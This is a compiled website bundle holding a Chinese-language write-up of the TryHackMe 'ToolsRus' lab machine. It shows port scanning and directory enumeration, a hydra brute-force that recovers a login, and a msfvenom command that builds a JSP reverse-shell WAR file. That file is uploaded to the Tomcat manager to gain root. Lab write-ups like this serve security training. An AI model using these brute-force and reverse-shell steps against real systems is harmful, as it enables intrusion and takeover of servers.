"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[685],{93405:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>l});var s=n(74848),o=n(28453);const r={sidebar_position:22,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","Tomcat"],title:"ToolsRus",description:"ToolsRus",sidebar_label:"ToolsRus",slug:"/tryhackme/22"},a="ToolsRus",i={id:"box/TryHackMe/22",title:"ToolsRus",description:"ToolsRus",source:"@site/docs/box/TryHackMe/22.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/22",permalink:"/docs/tryhackme/22",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801"},{label:"Tomcat",permalink:"/docs/tags/tomcat"}],version:"current",sidebarPosition:22,frontMatter:{sidebar_position:22,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","Tomcat"],title:"ToolsRus",description:"ToolsRus",sidebar_label:"ToolsRus",slug:"/tryhackme/22"},sidebar:"boxSidebar",previous:{title:"Chill Hack",permalink:"/docs/tryhackme/21"},next:{title:"GamingServer",permalink:"/docs/tryhackme/23"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"1234 - Tomcat",id:"1234---tomcat",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"root",id:"root",level:3}];function p(e){const t={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"toolsrus",children:"ToolsRus"}),"\n",(0,s.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-29-123:~# nmap -sT -p- --min-rate 1000 10.10.252.184\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-17 10:38 BST\nNmap scan report for ip-10-10-252-184.eu-west-1.compute.internal (10.10.252.184)\nHost is up (0.00043s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1234/tcp open  hotline\n8009/tcp open  ajp13\nMAC Address: 02:2C:A3:D4:02:A1 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.70 seconds\nroot@ip-10-10-29-123:~# nmap -sTCV -p 22,80,1234,8009 --min-rate 1000 10.10.252.184\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-17 10:38 BST\nNmap scan report for ip-10-10-252-184.eu-west-1.compute.internal (10.10.252.184)\nHost is up (0.00022s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f2:4f:b9:d5:4b:2e:b7:c5:f7:7d:1e:63:5b:3e:1b:6a (RSA)\n|   256 f2:55:91:09:e3:47:95:54:a8:55:af:d8:5c:e8:13:49 (ECDSA)\n|_  256 4d:84:15:9f:cc:61:94:79:b3:67:12:91:d2:be:b3:12 (EdDSA)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\nMAC Address: 02:2C:A3:D4:02:A1 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.58 seconds\n"})}),"\n",(0,s.jsx)(t.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-29-123:~# gobuster dir -u http://10.10.252.184/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.252.184/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt\n[+] Timeout:        10s\n===============================================================\n2023/08/17 10:40:28 Starting gobuster\n===============================================================\n/guidelines (Status: 301)\n/protected (Status: 401)\n"})}),"\n",(0,s.jsx)(t.admonition,{type:"note",children:(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:"guidelines  : \u544a\u8bc9\u6211\u4eec\u4e00\u4e2a\u7528\u6237 bob"}),"\n",(0,s.jsx)(t.li,{children:"protected  : \u8fd9\u4e2a\u9875\u9762\u9700\u8981\u6211\u4eec\u767b\u9646\u540e\u624d\u53ef\u4ee5\u8bbf\u95ee"}),"\n"]})}),"\n",(0,s.jsx)(t.p,{children:"\u4e4b\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3, \u7834\u89e3\u5bf9\u5e94\u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-29-123:~# hydra -l bob -P `locate rockyou.txt` -s 80 -f 10.10.252.184 http-get /protected\nHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2023-08-17 11:02:09\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task\n[DATA] attacking http-get://10.10.252.184:80//protected\n[80][http-get] host: 10.10.252.184   login: bob   password: bubbles\n[STATUS] attack finished for 10.10.252.184 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u767b\u9646\u4e4b\u540e\u9875\u9762\u663e\u793a, This protected page has now moved to a different port."}),"\n",(0,s.jsx)(t.p,{children:"\u6839\u636e\u4e4b\u524d\u7684\u7aef\u53e3\u4fe1\u606f\u6211\u4eec\u77e5\u9053 1234 \u662f\u4e00\u4e2a Tomcat Server  \u90a3\u4e48\u6709\u53ef\u80fd\u8fd9\u4e2a\u5bc6\u7801\u5c31\u662f\u90a3\u4e2a\u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(t.h2,{id:"1234---tomcat",children:"1234 - Tomcat"}),"\n",(0,s.jsx)(t.p,{children:"\u4f7f\u7528 80 \u5904\u66b4\u529b\u7834\u89e3\u7684\u5bc6\u7801\u5c1d\u8bd5\u767b\u9646 Tomcta \u7ba1\u7406\u9875\u9762\u53d1\u73b0\u53ef\u4ee5\u767b\u9646, \u4f7f\u7528 MSF \u5236\u4f5c war \u7684\u540e\u95e8\u4e0a\u4f20"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-29-123:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.29.123 LPORT=4444 -f war > shell.war\nPayload size: 1093 bytes\nFinal size of war file: 1093 bytes\n"})}),"\n",(0,s.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(t.h3,{id:"root",children:"root"}),"\n",(0,s.jsx)(t.p,{children:"\u4e0a\u4f20\u6210\u529f\u540e\u5728\u672c\u5730\u5f00\u542f\u76d1\u542c\u540e\u8bbf\u95ee\u5373\u53ef"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240531232447.png",alt:"20240531232447"})})]})}function d(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(p,{...e})}):p(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>i});var s=n(96540);const o={},r=s.createContext(o);function a(e){const t=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function i(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);